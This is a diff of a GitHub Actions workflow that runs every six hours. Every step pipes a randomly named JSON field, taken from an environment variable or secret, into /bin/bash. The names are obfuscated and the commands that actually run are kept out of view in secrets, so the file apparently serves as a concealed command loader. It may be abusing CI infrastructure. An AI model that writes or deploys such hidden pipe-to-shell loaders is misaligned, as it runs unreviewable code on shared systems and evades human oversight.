@@ -1,33 +1,28 @@
 name: shawennixiang
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
-
-jobs:  # 10156
+    - cron: '34 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shawennixiang
         env:
-          liad919: ${{ secrets.liad919 }}
+          oprto7: ${{ secrets.oprto7 }}
         run: |
-          echo $liad919 | jq -r .aoz7570 | /bin/bash
-          echo $df2 | jq -r .k4052 | /bin/bash
-          echo $ce87 | jq -r .nn91 | /bin/bash
-          echo $bkc003 | jq -r .kiwzr65 | /bin/bash
-          echo $n53676 | jq -r .j0 | /bin/bash
-          echo $ph6 | jq -r .xp91 | /bin/bash
-          echo $a5764 | jq -r .o1 | /bin/bash
-          echo $gr75 | jq -r .znwjx0445 | /bin/bash
-          echo $wyj5 | jq -r .p829 | /bin/bash
-          echo $wrg7868 | jq -r .xume40 | /bin/bash
-          echo $l36466 | jq -r .c0028 | /bin/bash
-          echo $k8167 | jq -r .dqef81 | /bin/bash
-          echo $vtpf380 | jq -r .bflt585 | /bin/bash
-          echo $kjhrk221 | jq -r .gfiss316 | /bin/bash
-          echo $ah811 | jq -r .qk44 | /bin/bash
-          echo $ly9131 | jq -r .c764 | /bin/bash
+          echo $oprto7 | jq -r .znm44 | /bin/bash
+          echo $ofz6534 | jq -r .d1 | /bin/bash
+          echo $drq70 | jq -r .v8264 | /bin/bash
+          echo $w3757 | jq -r .magnt42 | /bin/bash
+          echo $nj3 | jq -r .yuts8 | /bin/bash
+          echo $e2 | jq -r .zk78 | /bin/bash
+          echo $gujnr038 | jq -r .pia6923 | /bin/bash
+          echo $jg748 | jq -r .ux5 | /bin/bash
+          echo $wmk0222 | jq -r .qeb045 | /bin/bash
+          echo $nzh5 | jq -r .p601 | /bin/bash
+          echo $xvgu0 | jq -r .vxryw0 | /bin/bash
+          echo $dcayn38 | jq -r .bojt7571 | /bin/bash
+          echo $qcahq2 | jq -r .o9 | /bin/bash
 
